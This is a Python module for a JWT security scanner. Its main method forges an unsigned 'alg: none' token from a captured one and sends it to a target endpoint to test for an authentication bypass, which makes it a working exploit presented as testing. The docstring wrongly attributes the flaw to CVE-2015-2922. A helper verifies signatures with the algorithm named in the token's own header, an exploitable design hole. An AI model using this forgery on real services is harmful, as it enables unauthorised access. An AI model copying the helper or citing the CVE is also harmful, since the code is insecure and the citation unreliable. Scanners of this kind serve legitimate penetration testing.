# modules/jwt/scanner.py
import requests
import jwt
from core.utils.logger import CyberLogger
import base64
import json

class JWTSecurityScanner:
    def __init__(self):
        self.logger = CyberLogger()
        self.session = requests.Session()
        self.unauthorized_statuses = [401, 403]
        self.success_statuses = [200, 201, 204]

    def _make_request(self, url, method="GET", headers=None, data=None, json_data=None, cookies=None):
        """Helper to make HTTP requests."""
        try:
            response = self.session.request(method.upper(), url, headers=headers, data=data, json=json_data, cookies=cookies, timeout=10)
            return response
        except requests.exceptions.RequestException as e:
            self.logger.error(f"JWT security request failed for {url} ({method}): {e}")
            return None

    def _decode_jwt(self, token, verify=False, key=None):
        """Helper to decode JWT. If verify is True, a key must be provided."""
        try:
            if verify and key:
                # Attempt to decode and verify with the provided key and algorithms
                header = jwt.get_unverified_header(token)
                algorithms = [header.get('alg', 'HS256')] # Use algorithm from header
                decoded = jwt.decode(token, key, algorithms=algorithms, options={"verify_signature": True})
            else:
                # Decode without verification
                decoded = jwt.decode(token, options={"verify_signature": False, "verify_aud": False, "verify_iss": False, "verify_exp": False, "verify_nbf": False, "verify_iat": False})
            return decoded
        except jwt.PyJWTError as e:
            self.logger.warning(f"Failed to decode or verify JWT: {e}")
            return None

    def test_none_algorithm(self, jwt_token, target_url, method="GET", headers=None, data=None, json_data=None, cookies=None):
        """
        Tests for 'none' algorithm vulnerability (CVE-2015-2922).
        Attempts to bypass signature verification by setting 'alg' to 'none'.
        
        :param jwt_token: The original JWT token to manipulate.
        :param target_url: The URL where the JWT is typically sent.
        :param method: HTTP method (GET, POST, etc.) for the request.
        :param headers: Original headers for the request.
        :param data: Original request body data.
        :param json_data: Original request body JSON data.
        :param cookies: Original request cookies.
        :return: A list of dicts, each representing a found 'none' algorithm vulnerability.
        """
        self.logger.info(f"Testing 'none' algorithm vulnerability for JWT on {target_url}")
        vulnerabilities = []

        try:
            # 1. Decode the original token to get header and payload
            decoded_header = jwt.get_unverified_header(jwt_token)
            decoded_payload = self._decode_jwt(jwt_token, verify=False)

            if not decoded_payload:
                self.logger.warning("Could not decode original JWT. Cannot proceed with 'none' algorithm test.")
                return []

            # 2. Modify header to set 'alg' to 'none'
            none_header = decoded_header.copy()
            none_header['alg'] = 'none'

            # 3. Create a new token with 'none' algorithm and no signature
            # jwt.encode expects bytes for key, so pass an empty string or None for 'none' algo
            try:
                # The PyJWT library requires a key even for 'none', but it won't be used for signing.
                # An empty string is often sufficient, or sometimes None depending on PyJWT version.
                # The important part is that options={"None": None} allows the alg="none" to pass encode.
                # However, for 'none' attack, you generally craft header.payload.empty_signature
                # PyJWT's encode() specifically signs. We need to manually construct.
                
                # Manual construction for 'none' algorithm
                none_encoded_header = base64.urlsafe_b64encode(json.dumps(none_header).encode()).rstrip(b'=').decode()
                none_encoded_payload = base64.urlsafe_b64encode(json.dumps(decoded_payload).encode()).rstrip(b'=').decode()
                modified_token = f"{none_encoded_header}.{none_encoded_payload}." # No signature
                self.logger.info(f"Crafted 'none' algorithm token: {modified_token}")

            except Exception as e:
                self.logger.error(f"Error crafting 'none' algorithm token: {e}")
                return []

            # 4. Send the modified token to the target URL
            test_headers = headers.copy() if headers else {}
            if 'Authorization' in test_headers and test_headers['Authorization'].startswith('Bearer '):
                test_headers['Authorization'] = f"Bearer {modified_token}"
            elif 'x-auth-token' in test_headers: # Common header for JWT
                test_headers['x-auth-token'] = modified_token
            else:
                self.logger.warning("JWT token not found in common headers ('Authorization', 'x-auth-token'). Please ensure JWT is sent in request.")
                return []


            self.logger.info(f"Sending request with 'none' algorithm token to {target_url}")
            response = self._make_request(target_url, method=method, headers=test_headers, data=data, json_data=json_data, cookies=cookies)

            if response is None:
                self.logger.warning(f"No response received from {target_url} for 'none' algorithm test.")
                return []

            # 5. Analyze the response
            if response.status_code in self.success_statuses:
                self.logger.success(f"Potential 'none' algorithm JWT vulnerability: {target_url} returned {response.status_code} with modified token.")
                vulnerabilities.append({
                    "vulnerability": "JWT 'none' algorithm bypass",
                    "url": target_url,
                    "method": method,
                    "details": f"Server accepted JWT with 'alg':'none' and no signature. Status: {response.status_code}. Response: {response.text[:500]}",
                    "modified_token": modified_token
                })
            elif response.status_code not in self.unauthorized_statuses:
                self.logger.info(f"Response status {response.status_code} for 'none' algorithm test. May indicate partial bypass or misconfiguration.")
            else:
                self.logger.info(f"'none' algorithm test: Access denied as expected (Status: {response.status_code}). Protected.")

        except Exception as e:
            self.logger.error(f"An unexpected error occurred during 'none' algorithm test: {e}")
        
        return vulnerabilities

    def scan(self, scan_type="none_algorithm", **kwargs):
        """
        Main entry point for JWT security scans.
        :param scan_type: Type of JWT scan to perform (e.g., "none_algorithm").
        :param kwargs: Arguments specific to the scan type.
        """
        if scan_type == "none_algorithm":
            return self.test_none_algorithm(**kwargs)
        else:
            self.logger.error(f"Unknown JWT scan type: {scan_type}")
            return []


# --- For direct testing of this module ---
if __name__ == '__main__':
    # Set up basic logging for standalone test
    import logging
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    print("--- Testing JWTSecurityScanner ---")
    scanner = JWTSecurityScanner()

    # --- Test 1: Example 'none' Algorithm Scan ---
    # To properly test this, you'd need:
    # 1. A web application that uses JWT for authentication/authorization.
    # 2. This application should be vulnerable to the 'none' algorithm attack.
    #    (e.g., it does not verify the signature if 'alg' header is 'none').
    # 3. You need a valid JWT token that the application initially provides.
    #    The `target_url` is where this token is usually sent for authenticated actions.

    # IMPORTANT: Replace this with a real JWT token from your target application.
    # Example: A JWT for a user "testuser"
    # This token will be for 'HS256' or similar, then modified to 'none' for the test.
    
    # Example valid JWT (for testing only, replace with real token):
    # Header: {"alg":"HS256","typ":"JWT"}
    # Payload: {"user":"admin","iat":1678886400}
    # This needs to be a real, valid JWT token from your target application.
    example_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2Nzg4ODY0MDB9.signature_goes_here_if_valid"
    
    # Replace with the actual URL where the JWT is sent (e.g., an authenticated API endpoint)
    example_target_url = "http://localhost:8080/api/v1/profile" 
    
    # Ensure this reflects how your application sends the JWT
    example_headers = {
        "Authorization": f"Bearer {example_jwt}",
        "Content-Type": "application/json"
    }

    print(f"\n--- Scanning JWT for 'none' algorithm vulnerability on {example_target_url} ---")
    found_vulnerabilities = scanner.scan(
        scan_type="none_algorithm",
        jwt_token=example_jwt,
        target_url=example_target_url,
        method="GET",
        headers=example_headers
    )
    
    if found_vulnerabilities:
        print("\n--- JWT Scan Results ('none' algorithm) ---")
        for vuln in found_vulnerabilities:
            print(f"  Vulnerability: {vuln['vulnerability']}")
            print(f"  URL: {vuln['url']}")
            print(f"  Details: {vuln['details']}")
            print(f"  Modified Token: {vuln['modified_token']}")
            print("-" * 30)
    else:
        print("\nNo 'none' algorithm JWT vulnerabilities detected for the test endpoint.")